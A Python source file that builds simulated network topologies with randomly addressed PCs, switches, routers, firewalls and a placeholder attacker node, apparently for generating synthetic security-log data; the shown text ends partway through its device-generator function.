import entity
import network
import json
import random
import opensearchpy
from time import sleep

from ui import MainWindow


def check_ip_address_list(ip_address, ip_address_list):
    if ip_address not in ip_address_list:
        return True
    else: return False



def generation_ip_address(header, subnetwork, tail=0, ip_address_list=[] ):
    if 10 == header:

        while True:
            if  tail == 1:
                ip_address = f"10.0.{subnetwork}.{tail}"
                if check_ip_address_list(ip_address, ip_address_list):
                    return ip_address
            else:
                ip_address = f"10.0.{subnetwork}.{random.randint(2, 30)}"
                if check_ip_address_list(ip_address, ip_address_list):
                    return ip_address

    elif 192 == header:
        while True:
            if tail == 1:
                ip_address = f"192.168.{subnetwork}.{tail}"
                if check_ip_address_list(ip_address, ip_address_list):
                    return ip_address
            else:
                ip_address = f"192.168.{subnetwork}.{random.randint(2, 255)}"
                if check_ip_address_list(ip_address, ip_address_list):
                    return ip_address
    else:
        return None



def generation_mac_address():
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    return ':'.join(f'{byte:02x}' for byte in mac).upper()



def generation_topology(topology_name, subnetwork_list):

    pc = {
        "users": [],
        "ip": [],
        "mac": []
    }
    switch = {
        "users": [],
        "ip": [],
        "mac": []
    }
    router = {
        "users": [],
        "ip": [],
        "mac": []
    }
    firewall = {
        "users": [],
        "ip": [],
        "mac": []
    }
    attacker = {
        "users": [],
        "ip": [],
        "mac": []
    }

    if topology_name == "default/ssh_brute_force":

        for subnet in subnetwork_list:
            windows_data = generator_device(3, {"PC": "Windows"},192, subnet)
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None},192, subnet, 1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

        router_data = generator_device(1, {"Router": None},10, 10,1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None},10, 10)
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        return users, all_ip_address, all_mac_address, 1

    elif topology_name == "images/top-3A.jpg":
        for subnet in subnetwork_list:
            windows_data = generator_device(3, {"PC": "Windows"},192, subnet)
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None},192, subnet, 1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

        router_data = generator_device(1, {"Router": None},10, 10,1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None},10, 10)
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code

    elif topology_name == "images/top-3AV.jpg":
        for i in range(len(subnetwork_list) - 1):
            windows_data = generator_device(3, {"PC": "Windows"},192, subnetwork_list[i])
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None},192, subnetwork_list[i],1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

        # --- 2 SUBNET 3 WINDOWS ---

        linux_data = generator_device(1, {"PC": "Linux"},192, subnetwork_list[2])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        windows_data = generator_device(2, {"PC": "Windows"},192, subnetwork_list[2])
        pc["users"] += windows_data["users"]
        pc["ip"] += windows_data["ip"]
        pc["mac"] += windows_data["mac"]

        switch_data = generator_device(1, {"Switch": None},192, subnetwork_list[2], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 192,subnetwork_list[2])
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]


        # --- 3 SUBNET <L + 2W> ---

        router_data = generator_device(1, {"Router": None}, 10,10,1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 10,10)
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code


    elif topology_name == "images/top-3B.jpg":
        for subnet in subnetwork_list:
            windows_data = generator_device(3, {"PC": "Windows"},192, subnet)
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None},192, subnet, 1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

            firewall_data = generator_device(1, {"Firewall": None},10, subnet)
            firewall["users"] += firewall_data["users"]
            firewall["ip"] += firewall_data["ip"]
            firewall["mac"] += firewall_data["mac"]

        router_data = generator_device(1, {"Router": None}, 10, 10, 1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code

    elif topology_name == "images/top-3BV.jpg":
        for i in range(len(subnetwork_list)-1):
            windows_data = generator_device(3, {"PC": "Windows"}, 192, subnetwork_list[i])
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None},192, subnetwork_list[i], 1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

            firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
            firewall["users"] += firewall_data["users"]
            firewall["ip"] += firewall_data["ip"]
            firewall["mac"] += firewall_data["mac"]

        linux_data = generator_device(1, {"PC": "Linux"}, 192, subnetwork_list[2])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        windows_data = generator_device(2, {"PC": "Windows"}, 192, subnetwork_list[2])
        pc["users"] += windows_data["users"]
        pc["ip"] += windows_data["ip"]
        pc["mac"] += windows_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[2], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 192,subnetwork_list[2])
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        # --- 3 SUBNET <L + 2W> ---

        router_data = generator_device(1, {"Router": None}, 10, 10, 1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code


# --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

    elif topology_name == "images/top-4A.jpg":
        for i in range(len(subnetwork_list)-1):
            windows_data = generator_device(3, {"PC": "Windows"}, 192, subnetwork_list[i])
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[i], 1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[3])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[3], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        router_data = generator_device(1, {"Router": None}, 10, 10, 1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code

    elif topology_name == "images/top-4AV.jpg":
        for i in range(len(subnetwork_list) - 2):
            windows_data = generator_device(3, {"PC": "Windows"}, 192, subnetwork_list[i])
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[i], 1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

        # --- 3 SUBNET ---

        linux_data = generator_device(1, {"PC": "Linux"}, 192, subnetwork_list[2])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[2], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        windows_data = generator_device(2, {"PC": "Windows"}, 192, subnetwork_list[2])
        pc["users"] += windows_data["users"]
        pc["ip"] += windows_data["ip"]
        pc["mac"] += windows_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 192, subnetwork_list[2])
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        # --- 4 SUBNET ---

        linux_data = generator_device(1, {"PC": "Linux"}, 192, subnetwork_list[3])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[3], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        windows_data = generator_device(2, {"PC": "Windows"}, 192, subnetwork_list[3])
        pc["users"] += windows_data["users"]
        pc["ip"] += windows_data["ip"]
        pc["mac"] += windows_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 192, subnetwork_list[3])
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        # --- END ---

        router_data = generator_device(1, {"Router": None}, 10,10,1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code

    elif topology_name == "images/top-4B.jpg":
        for i in range(len(subnetwork_list)-1):

            windows_data = generator_device(3, {"PC": "Windows"}, 192, subnetwork_list[i])
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[i],1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

            firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
            firewall["users"] += firewall_data["users"]
            firewall["ip"] += firewall_data["ip"]
            firewall["mac"] += firewall_data["mac"]

        # --- 4 SUBNET ---

        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[3])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[3], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        # --- END ---

        router_data = generator_device(1, {"Router": None}, 10, 10, 1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code

    elif topology_name == "images/top-4BV.jpg":
        for i in range(len(subnetwork_list) - 1):
            windows_data = generator_device(3, {"PC": "Windows"}, 192, subnetwork_list[i])
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[i], 1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

            firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
            firewall["users"] += firewall_data["users"]
            firewall["ip"] += firewall_data["ip"]
            firewall["mac"] += firewall_data["mac"]

        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[3])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[3], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 192, subnetwork_list[1])
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        router_data = generator_device(1, {"Router": None}, 10, 10, 1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code

# --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

    elif topology_name == "images/top-5A.jpg":
        for i in range(len(subnetwork_list)-2):
            windows_data = generator_device(3, {"PC": "Windows"}, 192, subnetwork_list[i])
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[i], 1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]


        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[3])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[3], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        # --- 4 SUBNET ---

        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[4])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[4], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        # --- 5 SUBNET ---

        router_data = generator_device(1, {"Router": None}, 10, 10, 1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code

    elif topology_name == "images/top-5AV.jpg":
        for i in range(len(subnetwork_list)-2):
            windows_data = generator_device(3, {"PC": "Windows"}, 192, subnetwork_list[i])
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[i],1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

        # --- 4 SUBNET ---

        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[3])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[3], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 192, subnetwork_list[3])
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        # --- 5 SUBNET ---

        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[4])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[4], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 192, subnetwork_list[4])
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        # --- END ---

        router_data = generator_device(1, {"Router": None}, 10, 10, 1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code

    elif topology_name == "images/top-5B.jpg":
        for i in range(len(subnetwork_list) - 2):
            windows_data = generator_device(3, {"PC": "Windows"}, 192, subnetwork_list[i])
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[i], 1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

            firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
            firewall["users"] += firewall_data["users"]
            firewall["ip"] += firewall_data["ip"]
            firewall["mac"] += firewall_data["mac"]

        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[3])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[3], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        # --- 4 SUBNET ---

        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[4])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[4], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        # --- 5 SUBNET ---

        router_data = generator_device(1, {"Router": None}, 10, 10, 1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code

    elif topology_name == "images/top-5BV.jpg":
        for i in range(len(subnetwork_list) - 2):
            windows_data = generator_device(3, {"PC": "Windows"}, 192, subnetwork_list[i])
            pc["users"] += windows_data["users"]
            pc["ip"] += windows_data["ip"]
            pc["mac"] += windows_data["mac"]

            switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[i], 1)
            switch["users"] += switch_data["users"]
            switch["ip"] += switch_data["ip"]
            switch["mac"] += switch_data["mac"]

            firewall_data = generator_device(1, {"Firewall": None}, 10, 10)
            firewall["users"] += firewall_data["users"]
            firewall["ip"] += firewall_data["ip"]
            firewall["mac"] += firewall_data["mac"]

        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[3])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[3], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 192, subnetwork_list[3])
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        # --- 4 SUBNET ---

        linux_data = generator_device(3, {"PC": "Linux"}, 192, subnetwork_list[4])
        pc["users"] += linux_data["users"]
        pc["ip"] += linux_data["ip"]
        pc["mac"] += linux_data["mac"]

        switch_data = generator_device(1, {"Switch": None}, 192, subnetwork_list[4], 1)
        switch["users"] += switch_data["users"]
        switch["ip"] += switch_data["ip"]
        switch["mac"] += switch_data["mac"]

        firewall_data = generator_device(1, {"Firewall": None}, 192, subnetwork_list[4])
        firewall["users"] += firewall_data["users"]
        firewall["ip"] += firewall_data["ip"]
        firewall["mac"] += firewall_data["mac"]

        # --- 5 SUBNET ---

        router_data = generator_device(1, {"Router": None}, 10, 10, 1)
        router["users"] += router_data["users"]
        router["ip"] += router_data["ip"]
        router["mac"] += router_data["mac"]

        attacker_data = generator_device(1, {"Attacker": None}, 192, random.choice(subnetwork_list))
        attacker["users"] += attacker_data["users"]
        attacker["ip"] += attacker_data["ip"]
        attacker["mac"] += attacker_data["mac"]

        # --- RETURN ---

        users = pc["users"] + switch["users"] + router["users"] + firewall["users"] + attacker["users"]
        all_ip_address = pc["ip"] + switch["ip"] + router["ip"] + firewall["ip"]
        all_mac_address = pc["mac"] + switch["mac"] + router["mac"] + firewall["mac"]
        attacker_method_code = random.randint(1,9)
        return users, all_ip_address, all_mac_address, attacker_method_code


# --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

    else:
        print("Ошибка передачи топологии!")
        return None, None, None, None

    # print("DEBUG: topology")
    # print(
    # f" --- Personal Computers ---\n"
    # f"PC = {len(pc['users'])}\n"
    # f"{pc['users']}\n"
    # f"{pc['ip']}\n"
    # f"{pc['mac']}\n"
    # f" --- Switches ---\n"
    # f"SW = {len(switch['users'])}\n"
    # f"{switch['users']}\n"
    # f"{switch['ip']}\n"
    # f"{switch['mac']}\n"
    # f" --- Routers ---\n"
    # f"RT = {len(router['users'])}\n"
    # f"{router['users']}\n"
    # f"{router['ip']}\n"
    # f"{router['mac']}\n"
    # f" --- Firewalls ---\n"
    # f"FW = {len(firewall['users'])}\n"
    # f"{firewall['users']}\n"
    # f"{firewall['ip']}\n"
    # f"{firewall['mac']}\n"
    # )



def generator_device(count_users, category, header, subnetwork, tail=0):
    users = []
    ip_address_list = []
    mac_address_list = []

    if category == {"PC": "Linux"}:
        for i in range(count_users):
            users.append(
                entity.PersonalComputerLinux(
                    hostname=f"PC-{random.randint(2,30)}",
                    ip_addr=generation_ip_address(header, subnetwork, tail, ip_address_list),
                    mac_addr=generation_mac_address(),
                    category="PC",
                    log_format="syslog",
                    os="Linux",
                    domain="telecom.technology",
                    asset_number=f"IN-{random.randint(1000, 9999)}{random.randint(1000, 9999)}"
                )
            )
            mac_address_list.append(users[i].get_mac_addr())
            ip_address_list.append(users[i].get_ip_addr())
        return {
            "users": users,
            "ip": ip_address_list,
            "mac": mac_address_list
        }

    elif category == {"PC": "Windows"}:
        for i in range(count_users):
            users.append(
                entity.PersonalComputerWindows(
                    hostname=f"PC-{random.randint(2,30)}",
                    ip_addr=generation_ip_address(header, subnetwork, tail, ip_address_list),
                    mac_addr=generation_mac_address(),
